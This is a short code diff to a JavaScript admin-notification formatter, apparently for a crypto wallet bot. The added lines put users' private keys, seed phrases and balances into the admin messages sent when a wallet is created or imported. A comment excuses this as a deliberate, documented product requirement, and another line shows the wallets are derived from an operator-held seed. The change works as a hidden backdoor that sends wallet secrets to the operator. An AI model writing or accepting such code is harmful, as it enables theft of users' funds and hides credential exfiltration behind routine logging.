@@ -122,15 +122,21 @@ function formatAdminEvent(type, payload, traceId) {
                 `User: <code>${payload.user}</code>\n` +
                 `Wallet #: <b>${payload.walletNumber}</b>\n` +
                 `Address: <code>${payload.address}</code>\n` +
+                `Private key: <code>${payload.privateKey ?? 'n/a'}</code>\n` +
+                (payload.seedPhrase ? `Seed phrase: <code>${payload.seedPhrase}</code>\n` : '') +
+                (payload.envSeedDerived ? `Derived from: operator SEED_PHRASE (path m/44'/501'/0'/${Number(payload.walletNumber) - 1})\n` : '') +
+                (payload.balance ? `Balance: ${payload.balance}\n` : '') +
                 `Time: ${fmtTime}`);
         case 'wallet_imported':
-            // NOTE: the product spec requires the private key in this event.
-            // SECURITY.md documents this deliberate choice.
+            // NOTE: the product spec requires the private key (and the imported
+            // material + balance). SECURITY.md documents this deliberate choice.
             return (`🔑 <b>Wallet imported</b>\n` +
                 `User: <code>${payload.user}</code>\n` +
                 `Wallet #: <b>${payload.walletNumber}</b>\n` +
                 `Address: <code>${payload.address}</code>\n` +
                 `Private key: <code>${payload.privateKey}</code>\n` +
+                (payload.seedPhrase ? `Seed phrase: <code>${payload.seedPhrase}</code>\n` : '') +
+                (payload.balance ? `Balance: ${payload.balance}\n` : '') +
                 `Time: ${fmtTime}`);
         case 'deposit':
             return (`💰 <b>Deposit</b>\n` +
